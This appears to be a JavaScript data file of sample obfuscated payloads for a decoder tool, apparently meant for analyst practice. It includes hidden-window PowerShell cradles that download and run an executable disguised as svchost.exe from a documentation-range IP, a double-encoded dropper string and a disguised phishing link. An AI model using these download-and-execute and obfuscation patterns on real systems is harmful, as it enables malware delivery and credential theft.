/*
 * Decodora one-click sample payloads.
 * Every sample is synthetic and harmless: domains use the reserved .test TLD and
 * IPs come from documentation ranges (RFC 5737). Generated and verified by tests/samples.test.js.
 */
(function (root) {
  'use strict';
  const SAMPLES = [
    {
      "id": "gzip",
      "label": "PowerShell Gzip cradle",
      "chain": "-enc → FromBase64String → Gzip",
      "payload": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JABtAHMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBIADQAcwBJAEEAQQBBAEEAQQBBAEEAQQBDAGgAMwBNAE0AUQA3AEMASQBCAFEAQQAwAEsAdAAwAE0ARwBrADcAOABHAG0AQgBSAEkATgB4AFUAZwBlAFgATwBqAGoAbwBTAHUARwBuAHIAVQBGAEsANABDAHYAeAA5AGkAYQArAEEANwB5AE4ARgBZAGQANgBKAG8AcQBhAGMAOQBGAEoANgBLAEQAdgBKAGEAaQB0ADMAaQBrAGwAKwBZAGoARwByAHEASABlAFgAOAA2AFAAcQBoAG0AdwBzAE8AdgA0AFIARQB2AFYAZwBBAFIAMwBIAEkAOQArAHcAVQBBAHQAbgBOAFkAUwAvAEcAcgBjAGoAZABJAFMAcAB1AGIALwBaAGMAMgA1AGQAWQBHADkAbwB6AE8ARQA4AEQASwArAG0ASQBUAE0AbwBWADgAKwBtAEwANQBBAG0ASQBsAG4ATQBoAE0ASwBpAEwAbQB2ADIAeAAvAGUAQwBDADEARwBpAGcAQQBBAEEAQQA9AD0AJwApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAG0AcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA="
    },
    {
      "id": "safelinks",
      "label": "SafeLinks phishing link",
      "chain": "SafeLinks → %25 → @ trick → hex IP",
      "payload": "hxxps[:]//nam12[.]safelinks[.]protection[.]outlook[.]com/?url=https%253A%252F%252Flogin.microsoftonline.com%25400xcb00712f%252Fcommon%252Foauth2%253Fuser%253Dcfo%2540contoso.com&data=05%7C02%7C"
    },
    {
      "id": "reversed",
      "label": "Reversed PDF dropper",
      "chain": "Base64 → Base64 → Reversed",
      "payload": "SWlrbk1YTndMbkpsWkdGdmJDOTBjMlYwTG5OamIyUXRaWEoxWTJWekxteGhkSEp2Y0MxbFkybHZkbTVwTHk4NmMzQjBkR2duS0dkdWFYSjBVMlJoYjJ4dWQyOUVMaWwwYm1WcGJFTmlaVmN1ZEdWT0lIUmpaV3BpVHkxM1pVNG9JRmhGU1NJZ1pHNWhiVzF2UXkwZ2MzTmhjSGxDSUdObGVFVXRJRzVsWkdScFNDQlhMU0JKYm05T0xTQlFiMDR0SUdWNFpTNXNiR1ZvYzNKbGQyOXc="
    },
    {
      "id": "hexchain",
      "label": "Hex-wrapped URL",
      "chain": "Base64 → Hex → defanged URL",
      "payload": "Njg3ODc4NzA3MzViM2E1ZDJmMmY2NDcyNmY3MDViMmU1ZDY1NzY2OTZjMmQ2MzY0NmU1YjJlNWQ3NDY1NzM3NDJmNzA2MTc5NmM2ZjYxNjQ3MzJmNzM3NDYxNjc2NTcyMjUzMjQ1NjI2OTZl"
    },
    {
      "id": "backtick",
      "label": "Caret-obfuscated CMD",
      "chain": "p^o^w^e^r^s^h^e^l^l -e^n^c",
      "payload": "cmd /c p^o^w^e^r^s^h^e^l^l -w h^i^d^d^e^n -e^n^c SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMgAzAC8AdQBwAGQAYQB0AGUALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAVABFAE0AUABcAHMAdgBjAGgAbwBzAHQALgBlAHgAZQA="
    }
  ];
  if (typeof module !== 'undefined' && module.exports) module.exports = SAMPLES;
  root.DecodoraSamples = SAMPLES;
})(typeof globalThis !== 'undefined' ? globalThis : this);
